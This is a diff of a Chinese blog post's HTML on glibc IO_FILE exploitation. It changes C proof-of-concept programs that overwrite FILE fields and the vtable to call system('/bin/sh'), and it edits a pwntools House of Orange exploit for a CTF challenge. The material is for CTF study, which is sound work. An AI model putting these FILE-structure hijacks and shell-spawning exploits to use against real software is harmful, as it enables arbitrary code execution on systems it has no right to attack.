@@ -165,10 +165,6 @@
             <div class="markdown-body">
               <p>记录 IO_FILE 相关知识。</p>
 <a id="more"></a>
-<h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Ubuntu 16.04.6（glibc-2.23）：</p>
-<pre><code class="bash">$ uname -a
-Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
-</code></pre>
 <h1 id="FILE-Structure"><a href="#FILE-Structure" class="headerlink" title="FILE Structure"></a>FILE Structure</h1><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 <code>fopen</code> 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。FILE 相关的结构定义在 <a href="https://code.woboq.org/userspace/glibc/libio/libio.h.html" target="_blank" rel="noopener">glibc/libio/libio.h</a> 中：</p>
 <pre><code class="cpp">struct _IO_FILE {
   int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */
@@ -1245,7 +1241,7 @@ _IO_str_overflow (_IO_FILE *fp, int c)
 </ul>
 </li>
 <li><code>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_blen (fp) + flush_only</code> 为真（<code>#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</code>）；<ul>
-<li>构造 <code>_IO_write_base = 0</code>、<code>_IO_write_ptr = (bin_sh_in_libc_addr - 100) / 2 + 1</code> 以及 <code>_IO_buf_end = (bin_sh_in_libc_addr - 100) / 2</code>；</li>
+<li>构造 <code>_IO_write_base = 0</code>、<code>_IO_write_ptr = 0x7fffffffffffffff</code> 以及 <code>_IO_buf_end = (bin_sh_in_libc_addr - 100) / 2</code>（<code>&amp;&quot;/bin/sh&quot;</code> 需要是一个偶数）；</li>
 </ul>
 </li>
 <li><code>fp-&gt;_flags &amp; _IO_USER_BUF</code> 为假；</li>
@@ -1256,34 +1252,31 @@ _IO_str_overflow (_IO_FILE *fp, int c)
 <pre><code class="cpp">      new_buf
         = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);
 </code></pre>
-<p>测试代码如下（环境为 glibc-2.27）：</p>
+<p>测试代码如下（环境为 glibc-2.24）：</p>
 <pre><code class="cpp">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;stdint.h&gt;
 
-#define libc_base 0x7ffff79e4000
-#define _IO_file_jumps_addr 0x7ffff7dcc360
-#define bin_sh_in_libc_addr libc_base+0x1b3e9a
-#define system_addr libc_base+0x4f440
+#define libc_base 0x7ffff7a4e000
+#define _IO_2_1_stdin_addr libc_base+0x3878c0
+#define _IO_str_jumps_addr libc_base+0x384500
+#define bin_sh_in_libc_addr libc_base+0x14fc3d
+#define system_addr libc_base+0x3c971
 
 int main() {
     FILE *fp;
-    uint64_t *vtable_addr, *libio_vtable_addr;
-    fp = fopen(&quot;1.txt&quot;, &quot;rw&quot;);
+    char *bin_sh_on_stack_addr = &quot;/bin/sh&quot;;
+    fp = _IO_2_1_stdin_addr;//fopen(&quot;1.txt&quot;, &quot;rw&quot;);
     if (!fp) {
         printf(&quot;file not existed.\n&quot;);
         exit(-1);
     }
-    libio_vtable_addr = _IO_file_jumps_addr;
-    void *fake_write_ptr = (bin_sh_in_libc_addr - 100) / 2 + 1;
-    void *fake_buf_end = (bin_sh_in_libc_addr - 100) / 2;
     *(uint64_t *)((uint64_t)fp) = 0; // _flags
     *(uint64_t *)((uint64_t)fp + 0x20) = 0; // _IO_write_base
-    *(uint64_t *)((uint64_t)fp + 0x28) = fake_write_ptr; // _IO_write_ptr
-    *(uint64_t *)((uint64_t)fp + 0x40) = fake_buf_end; // _IO_buf_end
+    *(uint64_t *)((uint64_t)fp + 0x28) = 0x7fffffffffffffff; // _IO_write_ptr
+    *(uint64_t *)((uint64_t)fp + 0x40) = ((uint64_t)bin_sh_on_stack_addr - 100) / 2; // _IO_buf_end
     *(uint64_t *)((uint64_t)fp + 0xe0) = system_addr;
-    vtable_addr = (uint64_t *)((uint64_t)fp + 0xd8);
-    vtable_addr[0] = (uint64_t)libio_vtable_addr;
+    *(uint64_t *)((uint64_t)fp + 0xd8) = _IO_str_jumps_addr; // vtable
     exit(0);
 }
 </code></pre>
@@ -1307,27 +1300,28 @@ _IO_str_finish (_IO_FILE *fp, int dummy)
 </li>
 <li><code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code>（<code>fp + 0xe8</code>）指向 system 地址。</li>
 </ol>
-<p>测试代码如下（环境为 glibc-2.27）：</p>
+<p>测试代码如下（环境为 glibc-2.24）：</p>
 <pre><code class="cpp">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;stdint.h&gt;
 
-#define _IO_2_1_stdin_addr 0x7ffff7dcfa00
-#define libc_base 0x7ffff79e4000
-#define _IO_file_jumps_addr 0x7ffff7dcc360
-#define bin_sh_in_libc_addr libc_base+0x1b3e9a
-#define system_addr libc_base+0x4f440
+#define libc_base 0x7ffff7a4e000
+#define _IO_2_1_stdin_addr libc_base+0x3878c0
+#define _IO_str_jumps_addr libc_base+0x384500
+#define bin_sh_in_libc_addr libc_base+0x14fc3d
+#define system_addr libc_base+0x3c971
 
 int main() {
     FILE *fp;
-    uint64_t *vtable_addr, *libio_vtable_addr;
-    fp = _IO_2_1_stdin_addr;
-    libio_vtable_addr = _IO_file_jumps_addr;
+    fp = _IO_2_1_stdin_addr;//fopen(&quot;1.txt&quot;, &quot;rw&quot;);
+    if (!fp) {
+        printf(&quot;file not existed.\n&quot;);
+        exit(-1);
+    }
     *(uint64_t *)((uint64_t)fp) = 0; // _flags
     *(uint64_t *)((uint64_t)fp + 0x38) = bin_sh_in_libc_addr; // _IO_buf_base
     *(uint64_t *)((uint64_t)fp + 0xe8) = system_addr;
-    vtable_addr = (uint64_t *)((uint64_t)fp + 0xd8);
-    vtable_addr[0] = (uint64_t)libio_vtable_addr;
+    *(uint64_t *)((uint64_t)fp + 0xd8) = _IO_str_jumps_addr; // vtable
     fclose(fp);
     return 0;
 }
@@ -1729,7 +1723,7 @@ from pwn import *
 from FILE import *
 
 context.arch = &#39;amd64&#39;
-context.log_level = &#39;debug&#39;
+#context.log_level = &#39;debug&#39;
 context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]
 
 def cmd(c):
@@ -1770,12 +1764,16 @@ libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
 build(0x28, &#39;1&#39; * 8, 1, 1)
 upgrade(0x60, &#39;2&#39; * 0x40 + p64(0) + p64(0xf91), 1, 1) # Overflow top chunk
 build(0x1000, &#39;3&#39; * 0x8, 1, 1) # Trigger sysmalloc
-build(0x500, &#39;4&#39; * 0x8, 1, 1) # Get a chunk from Unsorted-bin &amp;&amp; Put the remain chunk into Smallbin
+build(0x500, &#39;4&#39; * 0x8, 1, 1) # Get a chunk from Unsorted-bin
 see() # Leak Unsorted-bin ptr
 p.recvuntil(&#39;4&#39; * 0x8)
 offset = 0x7fc27d99a188 - 0x7fc27d5d5000
 libc_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, &#39;\x00&#39;)) - offset
 info(&#39;libc_base = &#39; + hex(libc_base))
+if libc_base &amp; 0xffffffff &lt; 0x80000000:
+    warning(&#39;LOWWORD(libc_base) &lt; 0&#39;)
+    p.close()
+    exit(-1)
 one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
 one_gadget = libc_base + one_gadgets[3]
 
@@ -1796,12 +1794,16 @@ fake_file.vtable = heap_base + 0x6e0
 payload = &#39;6&#39; * 0x500 + p64(0) + p64(0x21) + p32(1) + p32(0x1f) + p64(0)
 payload += str(fake_file) # heap_base + 0x600
 payload += &#39;\x00&#39; * 0x18 + p64(one_gadget)
+info(&#39;one_gadget = &#39; + hex(one_gadget))
 #gdb.attach(p, &#39;dir ~/glibc-2.23/malloc\nb _int_malloc&#39; + &#39;\nc&#39; * 6)
 #gdb.attach(p, &#39;dir ~/glibc-2.23/libio\nb __libc_message\nb abort\nc&#39;)
 upgrade(0x800, payload, 1, 1)
 cmd(1)
 p.interactive()
 </code></pre>
+<blockquote>
+<p>House of Orange 并不是百分之百成功的，只有在 libc_base 的低 32 位为负数时才能成功，见<a href="https://www.anquanke.com/post/id/168802#h3-7" target="_blank" rel="noopener">这篇文章</a>。</p>
+</blockquote>
 <h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a><br><a href="https://ctftime.org/writeup/12124" target="_blank" rel="noopener">https://ctftime.org/writeup/12124</a><br><a href="https://dangokyo.me/2017/12/13/hitcon-2016-ctf-quals-house-of-orange-write-up/" target="_blank" rel="noopener">https://dangokyo.me/2017/12/13/hitcon-2016-ctf-quals-house-of-orange-write-up/</a><br><a href="https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/houseoforange.py" target="_blank" rel="noopener">https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/houseoforange.py</a><br><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="noopener">http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</a><br><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
 
             </div>
